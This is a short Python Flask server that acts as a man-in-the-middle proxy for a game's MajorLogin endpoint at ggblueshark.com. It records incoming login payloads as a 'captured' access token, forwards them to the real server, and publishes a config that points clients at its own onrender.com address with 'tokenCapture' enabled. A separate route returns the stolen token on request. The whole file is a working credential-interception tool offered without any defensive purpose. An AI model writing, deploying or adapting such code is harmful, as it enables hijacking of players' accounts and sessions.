from flask import Flask, request, jsonify
import requests
import json
import time

app = Flask(__name__)
tokens = {}

REAL_MAJOR_LOGIN_URL = "https://loginbp.ggblueshark.com/MajorLogin"

@app.route('/')
def home():
    return "✅ Server is running!"

@app.route('/MajorLogin', methods=['POST', 'GET'])
def major_login():
    if request.method == 'GET':
        return "MajorLogin endpoint - send POST", 200
    
    raw = request.get_data()
    print(f"[*] Received {len(raw)} bytes")
    
    if raw:
        tokens['latest'] = {
            'access_token': raw.hex()[:64],
            'open_id': 'captured',
            'timestamp': time.time()
        }
        print(f"[+] Token stored")
    
    try:
        response = requests.post(
            REAL_MAJOR_LOGIN_URL,
            data=raw,
            headers={"Content-Type": "application/octet-stream"},
            timeout=10
        )
        return response.content, response.status_code, {
            "Content-Type": "application/octet-stream"
        }
    except Exception as e:
        print(f"[-] Error: {e}")
        return f"Proxy error: {e}", 500

@app.route('/api/config', methods=['GET'])
def config():
    return jsonify({
        "verAddr": "https://accesstoken-i0dx.onrender.com/MajorLogin",
        "tokenCapture": True,
        "version": "1.0.0"
    })

@app.route('/api/get-token', methods=['GET'])
def get_token():
    data = tokens.get('latest')
    if data:
        return jsonify(data)
    return jsonify({"error": "No token yet"}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
